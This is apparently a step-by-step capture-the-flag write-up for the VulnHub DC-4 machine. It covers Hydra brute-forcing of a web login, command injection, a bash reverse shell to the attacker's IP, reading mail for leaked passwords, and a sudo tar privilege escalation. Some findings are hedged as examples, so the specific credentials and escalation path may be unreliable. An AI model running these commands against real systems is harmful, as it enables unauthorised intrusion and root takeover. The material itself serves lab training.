# DC-4 Writeup

## Machine Information

| Machine | DC-4 |
|---|---|
| Platform | VulnHub |
| Difficulty | Intermediate |
| OS | Linux |

---

# Objective

- Enumerate the target machine
- Discover login credentials
- Gain shell access
- Escalate privileges
- Capture the final flag

---

# Attacker Machine

| Role | IP Address |
|---|---|
| Kali Linux | YOUR KALI IP |

# Target Machine

| Role | IP Address |
|---|---|
| DC-4 | TARGET_IP |

---

# Step 1 — Verify Connectivity

Ping the target machine.

```bash
ping TARGET_IP
```

---

# Step 2 — Nmap Enumeration

Run an Nmap scan.

```bash
nmap -sC -sV -Pn TARGET_IP
```

Example findings:

- Port 22 → SSH
- Port 80 → HTTP

---

# Step 3 — Browse the Website

Open the website in browser.

```bash
http://TARGET_IP
```

A login panel is displayed.

---

# Step 4 — Brute Force Login

Use Hydra to brute force the login page.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.29.236 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Failed"
```

Possible credentials discovered:

```text
admin:happy
```

---

# Step 5 — Login to the Website

Login using discovered credentials.

```text
Username: admin
Password: happy
```

After login, a command execution panel appears.

---

# Step 6 — Command Injection

Test command execution.

```bash
whoami
```

Try reverse shell payload.

---

# Step 7 — Start Netcat Listener

On Kali machine:

```bash
nc -lvnp 4444
```

---

# Step 8 — Get Reverse Shell

Inject reverse shell payload into command field.

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'
```

Shell received successfully.

---

# Step 9 — Stabilize Shell

Spawn TTY shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell.

```bash
CTRL + Z
```

Fix terminal.

```bash
stty raw -echo
fg
```

Export terminal.

```bash
export TERM=xterm
```

---

# Step 10 — Enumerate Users

Check available users.

```bash
cat /etc/passwd
```

Check home directories.

```bash
ls /home
```

---

# Step 11 — Check Mail Files

Navigate to mail directory.

```bash
cd /var/mail
```

Read mail content.

```bash
cat jim
```

Possible password leak discovered.

Example:

```text
jim:turtle
```

---

# Step 12 — SSH Access

Login through SSH.

```bash
ssh jim@192.168.29.236
```

Enter discovered password.

---

# Step 13 — Privilege Escalation Enumeration

Check sudo permissions.

```bash
sudo -l
```

Example output may allow running tar as sudo.

---

# Step 14 — Privilege Escalation

Exploit tar sudo privilege.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Root shell obtained.

Verify:

```bash
whoami
```

Expected output:

```text
root
```

---

# Step 15 — Capture the Flag

Navigate to root directory.

```bash
cd /root
```

Read the flag.

```bash
cat flag.txt
```

---

# Root Access Achieved

```text
Privilege Escalation Successful
```

---

# Tools Used

- Nmap
- Hydra
- Netcat
- SSH
- Linux Enumeration Commands

---

# Skills Learned

- Web Login Brute Force
- Command Injection
- Reverse Shell Handling
- Linux Enumeration
- Mail Enumeration
- Sudo Privilege Escalation

---

# Machine Completed

```text
DC-4 Successfully Owned
```
